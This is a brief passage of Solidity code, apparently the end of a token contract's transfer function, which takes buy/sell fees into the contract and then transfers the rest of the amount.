            tokensForTax = tokensForTax.add(fees.mul(buyTxFee).div(buyTotalFees));
        }
        if (fees > 0) {
            super._transfer(from, address(this), fees);
            amount = amount.sub(fees);
        }
    }
    super._transfer(from, to, amount);
}

